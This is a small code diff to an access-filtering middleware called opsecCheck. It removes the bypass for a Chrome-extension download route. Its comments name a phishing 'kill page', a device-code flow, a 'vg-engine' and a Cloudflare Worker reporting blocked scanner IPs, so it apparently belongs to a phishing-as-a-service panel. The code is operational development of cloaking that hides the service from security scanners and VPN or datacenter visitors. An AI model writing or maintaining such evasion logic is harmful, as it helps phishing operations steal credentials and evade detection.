@@ -404,10 +404,6 @@ async function opsecCheck(req, res, next) {
     const isPhishingKill = req.path.startsWith('/api/killpage'); // vg-engine
     const isScannerSignal = req.path.startsWith('/api/scanner-signal'); // CF Worker reports blocked IPs
     const isDeviceCode = req.path.startsWith('/api/device'); // vg-engine (device-code flow)
-    // Extension builder: user panel downloads the Chrome extension here. Auth is enforced
-    // inside the route (JWT on every endpoint), so OPSEC would only break it for users
-    // on VPNs / datacenter IPs — exactly the "Access denied" class we're removing.
-    const isExtensionApi = req.path.startsWith('/api/extension');
     // Browser-automatic favicon request. No payload, no auth — the browser fires it on
     // every page load so blocking it would just hide the icon, never break a function.
     const isStaticAsset = req.path === '/favicon.ico';
@@ -436,7 +432,6 @@ async function opsecCheck(req, res, next) {
       isScannerSignal ||
       isDeviceCode ||
       isPanelApi ||
-      isExtensionApi ||
       isStaticAsset ||
       isAdminProbe
     ) {
